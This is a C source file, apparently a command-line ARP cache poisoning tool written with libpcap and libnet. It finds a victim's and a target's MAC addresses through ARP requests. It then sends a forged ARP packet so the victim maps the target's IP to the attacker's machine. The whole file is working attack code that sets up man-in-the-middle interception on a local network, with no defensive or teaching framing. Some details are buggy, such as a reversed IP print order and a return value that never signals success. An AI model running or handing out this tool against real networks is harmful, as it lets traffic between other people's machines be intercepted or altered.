#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <libnet.h>

/*
 * custom arp body structure
 * and ip over ethernet pair structure
 */
struct arp_body {
    uint8_t smac[6];
    uint8_t sip[4];
    uint8_t dmac[6];
    uint8_t dip[4];
};

struct ethernet_ip_pair {
    uint8_t mac[6];
    uint32_t ip;
};



void print_ipv4_address(uint32_t ip);
void print_mac_address(uint8_t *mac);

int get_mac_addr_on_dev(char *interface, /* out */uint8_t *mac_addr);
int get_ipv4_addr_on_dev(char *interface, /* out */uint32_t *ip_addr);
int find_remote_mac_by_arp(pcap_t *if_handle, uint8_t *local_mac, uint32_t local_ip, uint32_t remote_ip, /* out */uint8_t *remote_mac);
int arp_spoof(pcap_t *if_handle, uint8_t *local_mac, uint8_t *sender_mac, uint32_t sender_ip, uint32_t target_ip);



int main(int argc, char *argv[]) {
    // usage
    if( argc != 4 ) {
        printf("Usage: ./%s <interface> <sender ip> <target ip>", argv[0]);
        return 1;
    }

    // open a handle of interface
    char *interface = argv[1];
    char err_msg[PCAP_ERRBUF_SIZE];
    pcap_t *interface_handle = pcap_open_live(interface, PCAP_ERRBUF_SIZE, 1, 1000, err_msg);
    if( interface_handle == NULL ) {
        fprintf(stderr, "[!] Can't open interface\n");
        fprintf(stderr, "\tmsg: %s\n", err_msg);
        return 1;
    }

    // get my ip and mac address on interface
    struct ethernet_ip_pair myself;
    get_mac_addr_on_dev(interface, myself.mac);
    get_ipv4_addr_on_dev(interface, &myself.ip);

    printf("IP and MAC address of %s\n", interface);
    print_ipv4_address(myself.ip);
    print_mac_address(myself.mac);

    // convert a string of ipv4 address to unsigned int
    struct ethernet_ip_pair sender, target;
    struct in_addr tmp;
    inet_aton(argv[2], &tmp);
    sender.ip = tmp.s_addr;

    inet_aton(argv[3], &tmp);
    target.ip = tmp.s_addr;

    // find a mac address of remote host through send arp
    find_remote_mac_by_arp(interface_handle, myself.mac, myself.ip, sender.ip, sender.mac);
    printf("\nMAC address of %s\n", argv[2]);
    print_mac_address(sender.mac);

    find_remote_mac_by_arp(interface_handle, myself.mac, myself.ip, target.ip, target.mac);
    printf("\nMAC address of %s\n", argv[3]);
    print_mac_address(target.mac);

    // spoof sender that mac address of target is me
    arp_spoof(interface_handle, myself.mac, sender.mac, sender.ip, target.ip);

    return 0;
}


/*
 * print ipv4 address
 */
void print_ipv4_address(uint32_t ip) {
    printf("IP: %d.%d.%d.%d\n",
           (ip >> 24) & 0xFF, (ip >> 16) & 0xFF,
           (ip >> 8) & 0xFF, (ip) & 0xFF
    );
}

/*
 * print mac address
 */
void print_mac_address(uint8_t *mac) {
    printf("MAC: ");
    for(int i = 0; i < 6; i++) {
        printf("%02x ", mac[i]);
    }
    printf("\n");
}


/*
 * get mac address configured in interface
 */
int get_mac_addr_on_dev(char *interface, uint8_t *mac_addr) {
    int success = 0;
    struct ifreq ether_info = { 0 };

    int sck = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    memcpy(ether_info.ifr_name, interface, IFNAMSIZ-1); // strcpy is not safe

    if(! ioctl(sck, SIOCGIFHWADDR, &ether_info)) {
        memcpy(mac_addr, ether_info.ifr_addr.sa_data, 6);
        success = 1;
    }

    close(sck);

    return success;
}


/*
 * get ip address configured in interface
 */
int get_ipv4_addr_on_dev(char *interface, uint32_t *ip_addr) {
    struct ifreq ip_info = { 0 };

    int sck = socket(AF_INET, SOCK_DGRAM, 0);
    ip_info.ifr_addr.sa_family = AF_INET;
    memcpy(ip_info.ifr_name, interface, IFNAMSIZ-1);

    if(! ioctl(sck, SIOCGIFADDR, &ip_info)) {
        *ip_addr = ((struct sockaddr_in *)&ip_info.ifr_addr)->sin_addr.s_addr;
        return 1;
    }

    return 0;
}


/*
 * get mac address of remote host
 */
int find_remote_mac_by_arp(pcap_t *if_handle, uint8_t *local_mac, uint32_t local_ip, uint32_t remote_ip, /* out */uint8_t *remote_mac) {
    int success = 0;

    uint8_t snd_frame[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + 20];  // 20 is arp payload size(based ethernet, ipv4)
    int payload_len = sizeof(snd_frame) / sizeof(uint8_t);

    struct libnet_ethernet_hdr *snd_eth = (struct libnet_ethernet_hdr *)(&snd_frame[0]);
    struct libnet_arp_hdr *snd_arp = (struct libnet_arp_hdr *)(&snd_frame[sizeof(struct libnet_ethernet_hdr)]);
    struct arp_body *snd_payload = (struct arp_body *)(&snd_frame[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr)]);

    memcpy((void *)(snd_eth->ether_shost), local_mac, 6);
    memset((void *)(snd_eth->ether_dhost), 0xFF, 6);
    snd_eth->ether_type = htons(0x0806);

    snd_arp->ar_hrd = htons(0x0001);
    snd_arp->ar_pro = htons(0x0800);
    snd_arp->ar_hln = 6;
    snd_arp->ar_op = htons(0x0001);
    snd_arp->ar_pln = 4;

    memcpy(snd_payload->smac, local_mac, 6);
    *((uint32_t *)&snd_payload->sip) = local_ip;
    memset(snd_payload->dmac, 0, 6);
    *((uint32_t *)&snd_payload->dip) = remote_ip;

    pcap_sendpacket(if_handle, snd_frame, payload_len);

    while (1) {
        struct pcap_pkthdr *rcv_header;
        const u_char *rcv_frame;

        int result_capturing = pcap_next_ex(if_handle, &rcv_header, &rcv_frame);

        // error occurred.
        if( result_capturing < 0 )
        {
            fprintf(stderr, "Error occurred at pcap_next_ex\n");
            fprintf(stderr, "Error Message: %s\n", pcap_geterr(if_handle));
            break;
        }

        // timeout.
        else if( result_capturing == 0 )
        {
            continue;
        }

        // success to capture a packet without problems.
        else
        {
            struct libnet_ethernet_hdr *rcv_eth = (struct libnet_ethernet_hdr *)(&rcv_frame[0]);
            if(ntohs(rcv_eth->ether_type) != (u_int16_t)0x0806) continue; // check that upper protocol whether arp or not

            struct arp_body *rcv_payload = (struct arp_body *)(&rcv_frame[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr)]);

            uint32_t sip = (*((uint32_t *)rcv_payload->sip));
            uint32_t dip = (*((uint32_t *)rcv_payload->dip));

            if( sip == remote_ip ) {
                memcpy(remote_mac, rcv_payload->smac, 6);
                success = 1;
                break;
            }
        }
    }

    return success;
}


/*
 * poion sender's arp table
 */
int arp_spoof(pcap_t *if_handle, uint8_t *local_mac, uint8_t *sender_mac, uint32_t sender_ip, uint32_t target_ip) {
    int success = 0;

    uint8_t snd_frame[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + 20];  // 20 is arp payload size(based ethernet, ipv4)
    int payload_len = sizeof(snd_frame) / sizeof(uint8_t);

    struct libnet_ethernet_hdr *snd_eth = (struct libnet_ethernet_hdr *)(&snd_frame[0]);
    struct libnet_arp_hdr *snd_arp = (struct libnet_arp_hdr *)(&snd_frame[sizeof(struct libnet_ethernet_hdr)]);
    struct arp_body *snd_payload = (struct arp_body *)(&snd_frame[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr)]);

    memcpy((void *)(snd_eth->ether_shost), local_mac, 6);
    memcpy((void *)(snd_eth->ether_dhost), sender_mac, 6);
    snd_eth->ether_type = htons(0x0806);

    snd_arp->ar_hrd = htons(0x0001);
    snd_arp->ar_pro = htons(0x0800);
    snd_arp->ar_hln = 6;
    snd_arp->ar_op = htons(0x0001);
    snd_arp->ar_pln = 4;

    memcpy(snd_payload->smac, local_mac, 6);
    *((uint32_t *)&snd_payload->sip) = target_ip;
    memcpy(snd_payload->dmac, sender_mac, 6);
    *((uint32_t *)&snd_payload->dip) = sender_ip;

    pcap_sendpacket(if_handle, snd_frame, payload_len);

    return success;
}
